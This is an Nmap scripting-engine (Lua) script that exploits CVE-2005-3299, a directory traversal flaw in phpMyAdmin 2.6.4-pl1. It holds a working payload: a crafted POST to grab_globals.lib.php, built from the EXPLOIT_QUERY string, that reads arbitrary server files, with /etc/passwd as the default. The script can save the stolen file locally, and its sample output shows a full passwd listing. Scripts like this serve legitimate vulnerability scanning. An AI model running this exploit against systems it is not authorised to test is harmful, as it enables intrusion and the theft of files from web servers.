local rand = require "rand"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local http = require "http"
local io = require "io"
local vulns = require "vulns"

description = [[
Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and
possibly other versions) to retrieve remote files on the web server.

Reference:
* http://www.exploit-db.com/exploits/1244/
]]

---
-- @usage
-- nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'" <host/ip>
-- nmap -p80 --script http-phpmyadmin-dir-traversal <host/ip>
--
-- @args http-phpmyadmin-dir-traversal.file Remote file to retrieve. Default: <code>../../../../../etc/passwd</code>
-- @args http-phpmyadmin-dir-traversal.outfile Output file
-- @args http-phpmyadmin-dir-traversal.dir Basepath to the services page. Default: <code>/phpMyAdmin-2.6.4-pl1/</code>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-phpmyadmin-dir-traversal:
-- |   VULNERABLE:
-- |   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2005-3299
-- |     Description:
-- |       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
-- |
-- |     Disclosure date: 2005-10-nil
-- |     Extra information:
-- |       ../../../../../../../../etc/passwd :
-- |   root:x:0:0:root:/root:/bin/bash
-- |   daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-- |   bin:x:2:2:bin:/bin:/bin/sh
-- |   sys:x:3:3:sys:/dev:/bin/sh
-- |   sync:x:4:65534:sync:/bin:/bin/sync
-- |   games:x:5:60:games:/usr/games:/bin/sh
-- |   man:x:6:12:man:/var/cache/man:/bin/sh
-- |   lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-- |   mail:x:8:8:mail:/var/mail:/bin/sh
-- |   news:x:9:9:news:/var/spool/news:/bin/sh
-- |   uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-- |   proxy:x:13:13:proxy:/bin:/bin/sh
-- |   www-data:x:33:33:www-data:/var/www:/bin/sh
-- |   backup:x:34:34:backup:/var/backups:/bin/sh
-- |   list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-- |   irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-- |   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-- |   nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-- |   libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-- |   syslog:x:101:103::/home/syslog:/bin/false
-- |   sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
-- |   dps:x:1000:1000:dps,,,:/home/dps:/bin/bash
-- |   vboxadd:x:999:1::/var/run/vboxadd:/bin/false
-- |   mysql:x:103:110:MySQL Server,,,:/nonexistent:/bin/false
-- |   memcache:x:104:112:Memcached,,,:/nonexistent:/bin/false
-- |   ../../../../../../../../etc/passwd saved to passwd.txt
-- |
-- |     References:
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
-- |_      http://www.exploit-db.com/exploits/1244/
author = "Alexey Meshcheryakov"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

portrule = shortport.http

---
--Writes string to file
--Taken from: hostmap.nse
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

--Default configuration values
local EXPLOIT_QUERY = "usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=%s&subform[1][cXIb8O3]=1"
local DEFAULT_FILE = "../../../../../etc/passwd"
local DEFAULT_DIR = "/phpMyAdmin-2.6.4-pl1/"
local EXPLOIT_PATH = "libraries/grab_globals.lib.php"

action = function(host, port)
  local dir = stdnse.get_script_args("http-phpmyadmin-dir-traversal.dir") or DEFAULT_DIR
  local evil_uri = dir..EXPLOIT_PATH
  local rfile = stdnse.get_script_args("http-phpmyadmin-dir-traversal.file") or DEFAULT_FILE
  local evil_postdata = EXPLOIT_QUERY:format(rfile)
  local filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
  stdnse.debug1("HTTP POST %s%s", stdnse.get_hostname(host), evil_uri)
  stdnse.debug1("POST DATA %s", evil_postdata)

  local vuln = {
    title = 'phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion',
    IDS = {CVE = 'CVE-2005-3299'},
    state = vulns.STATE.NOT_VULN,
    description =
    [[PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
]],
    references = {
      'http://www.exploit-db.com/exploits/1244/',
    },
    dates = {
      disclosure = {year = '2005', month = '10', dat = '10'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  -- Check if we can distinguish vulnerable from non-vulnerable response
  local response = http.post(host, port, "/" .. rand.random_alpha(12),
    {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, nil, evil_postdata)
  local testable = true
  if response.status == 200 then
    testable = false
    stdnse.debug1("Server responds with 200 for POST to any URI.")
  end
  response = http.post(host, port, evil_uri,
    {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, nil, evil_postdata)
  if response.body and response.status==200 then
    stdnse.debug1("response : %s", response.body)
    vuln.state = testable and vulns.STATE.EXPLOIT or vulns.STATE.UNKNOWN
    vuln.extra_info = rfile.." :\n"..response.body
    if filewrite then
      local status, err = write_file(filewrite,  response.body)
      if status then
        vuln.extra_info = string.format("%s%s saved to %s\n", vuln.extra_info, rfile, filewrite)
      else
        vuln.extra_info = string.format("%sError saving %s to %s: %s\n", vuln.extra_info, rfile, filewrite, err)
      end
    end
  elseif response.status==500 then
    vuln.state = vulns.STATE.LIKELY_VULN
    stdnse.debug1("[Error] File not found:%s", rfile)
    stdnse.debug1("response : %s", response.body)
    vuln.extra_info = string.format("%s not found.\n", rfile)
  end
  return vuln_report:make_output(vuln)
end
